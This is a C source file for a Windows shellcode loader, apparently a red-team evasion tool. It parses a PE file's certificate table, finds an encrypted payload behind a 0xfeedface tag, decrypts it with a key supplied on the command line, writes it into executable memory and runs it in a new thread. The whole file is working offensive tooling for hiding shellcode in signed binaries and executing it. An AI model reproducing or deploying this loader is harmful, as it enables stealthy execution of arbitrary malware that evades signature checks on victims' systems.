#include <Windows.h>
#include <stdio.h>
#include "Helper.h"

/*
SigLoader.exe "C:\Temp\kernel32.dll" uu37WEi2lJNQO1N

[+]:Encrypted/Encoded Data Size for calc.bin: 232 (includes padding + tag '0xfeedface0xfeedface')
[+]:Extra Padding: 4
[+]:Encrypion Key: uu37WEi2lJNQO1N

Keep in mind:
x86 Shellcode -> x86 Loader
x64 Shellcode -> x64 Loader
*/

#define MAX_PATH_LENGTH 255

void main(int argc, char* argv[]) {

	printf("\n[*]: Basic Loader...\n\n");

	//Parsing arguments
	if (argc != 3) {
		printf("[!]: Missing PE path or Encryption Key...\n");
		printf("[!]: Usage: %s <PE_PATH> <Encryption_Key>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	CHAR _fPath[MAX_PATH_LENGTH] = {};
	HANDLE HThread = INVALID_HANDLE_VALUE;
	CHAR* _encKey = argv[2];
	DWORD _encryptedDataSize = 0;
	DWORD _dataOffset = 0;
	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert = {};
	CHAR* _decryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	LPVOID shellcode = NULL;
	BYTE* _pePtr = NULL;
	PIMAGE_DOS_HEADER _dosHeader = {};
	PIMAGE_NT_HEADERS _ntHeader = {};
	IMAGE_OPTIONAL_HEADER _optHeader = {};
	DWORD _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	SIZE_T _index = 0;

	//Loading PE File
	memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[1], MAX_PATH_LENGTH);
	printf("[*]: Loading/Parsing PE File '%s'\n", _fPath);
	_fHandle = CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		exit(EXIT_FAILURE);
	}


	_fSize = GetFileSize(_fHandle, NULL);
	_peBlob = (char*) malloc(_fSize);
	ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		goto _Exit;
	}
	
	_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		fprintf(stderr, "[!]: '%s' is not a valid PE file\n", _fPath);
		goto _Exit;
	}

	_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;

	if (IsWow64(GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	printf("[+]: Certificate Table RVA %x\n", _CertTableRVA);
	printf("[+]: Certificate Table Size %d\n", _CertTableSize);

	//Linear search for 0xfeedface0xfeedface tag
	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
	for (_index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xfe && *(_pePtr + _index + 1) == 0xed && *(_pePtr + _index + 2) == 0xfa && *(_pePtr + _index + 3) == 0xce) {
			printf("[*]: Tag Found 0x%x%x%x%x", *(_pePtr + _index), *(_pePtr + _index+1), *(_pePtr + _index+2), *(_pePtr + _index+3));
			_dataOffset = _index + 8;
			break;
		}
	}

	if (_dataOffset != _index + 8) {
		fprintf(stderr, "[!]: Could not locate data/shellcode");
		goto _Exit;
	}

	//Decrypting
	_encryptedDataSize = _CertTableSize - _dataOffset;
	_decryptedData = (CHAR*)malloc(_encryptedDataSize);
	memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);
	decrypt((unsigned char*)_decryptedData, _encryptedDataSize, (unsigned char*)_encKey, strlen(_encKey), (unsigned char*)_decryptedData);
	printf("\n[+]: Encrypted/Decrypted Data Size %d\n", _encryptedDataSize);

	//Execute shellcode (just a basic/vanilla local shellcode injection logic, You can use other techniques)
	//Customize the following as you see fit.
	shellcode = VirtualAlloc(NULL, _encryptedDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(), shellcode, _decryptedData, _encryptedDataSize, NULL);
	HThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)shellcode, 0, 0, 0);
	WaitForSingleObject(HThread, 0xFFFFFFFF);

_Exit:
	if (_peBlob) free(_peBlob);
	if (_decryptedData) free(_decryptedData);
	CloseHandle(_fHandle);

}